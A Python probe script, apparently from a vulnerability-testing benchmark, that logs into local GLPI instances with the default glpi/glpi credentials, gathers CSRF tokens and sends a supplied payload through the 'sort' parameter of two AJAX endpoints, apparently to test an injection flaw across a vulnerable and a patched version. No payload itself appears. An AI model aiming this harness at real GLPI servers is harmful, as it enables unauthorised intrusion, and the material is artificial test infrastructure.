#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import json
import os
import re
import sys

import requests

_CSRF_RE = re.compile(r'name=["\']_glpi_csrf_token["\']\s+value=["\']([0-9a-f]+)["\']')
GLPI_USER = "glpi"
GLPI_PASS = "glpi"
BASE = {
    "v0": "http://127.0.0.1:39820",
    "v1": "http://127.0.0.1:39821",
}


def _csrf(html: str):
    m = _CSRF_RE.search(html)
    return m.group(1) if m else None


def _input_name_by_id(html: str, input_id: str):
    m = re.search(r'<input[^>]*\bid="' + re.escape(input_id) + r'"[^>]*>', html)
    if not m:
        return None
    nm = re.search(r'\bname="([^"]+)"', m.group(0))
    return nm.group(1) if nm else None


def _login(sess: requests.Session, base: str) -> bool:
    r = sess.get(f"{base}/index.php", timeout=20)
    tok = _csrf(r.text)
    user_field = _input_name_by_id(r.text, "login_name")
    pass_field = _input_name_by_id(r.text, "login_password")
    if not tok or not user_field or not pass_field:
        return False
    sess.post(
        f"{base}/front/login.php",
        data={
            user_field: GLPI_USER,
            pass_field: GLPI_PASS,
            "_glpi_csrf_token": tok,
            "submit": "Post",
        },
        timeout=20,
        allow_redirects=True,
    )
    c = sess.get(f"{base}/front/central.php", timeout=20)
    return "login_password" not in c.text


def _fresh_token(sess: requests.Session, base: str):
    r = sess.get(f"{base}/front/preference.php", timeout=20)
    return _csrf(r.text)


def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    channel = candidate["channel"] if isinstance(candidate, dict) else "map"
    payload = candidate["payload"] if isinstance(candidate, dict) else str(candidate)
    sess = requests.Session()
    if not _login(sess, base):
        return {"version": version, "channel": channel, "status": "login_failed", "body": ""}
    tok = _fresh_token(sess, base)
    headers = {"X-Glpi-Csrf-Token": tok or ""}
    try:
        if channel == "map":
            data = {
                "itemtype": "User",
                "params[sort][]": payload,
                "params[start]": "0",
                "params[is_deleted]": "0",
                "_glpi_csrf_token": tok or "",
            }
            r = sess.post(f"{base}/ajax/map.php", data=data, headers=headers, timeout=30)
        else:
            data = {
                "action": "display_results",
                "itemtype": "User",
                "sort[]": payload,
                "start": "0",
                "is_deleted": "0",
                "_glpi_csrf_token": tok or "",
            }
            r = sess.post(f"{base}/ajax/search.php", data=data, headers=headers, timeout=30)
        return {"version": version, "channel": channel, "status": r.status_code, "body": r.text}
    except Exception as e:
        return {"version": version, "channel": channel, "status": "error", "body": repr(e)}


_pbt = os.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _v in list(BASE):
        BASE[_v] = _pbt
_pt = os.environ.get("PCB_TARGET_PORT")
if _pt:
    for _v in list(BASE):
        BASE[_v] = f"http://127.0.0.1:{int(_pt)}"


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
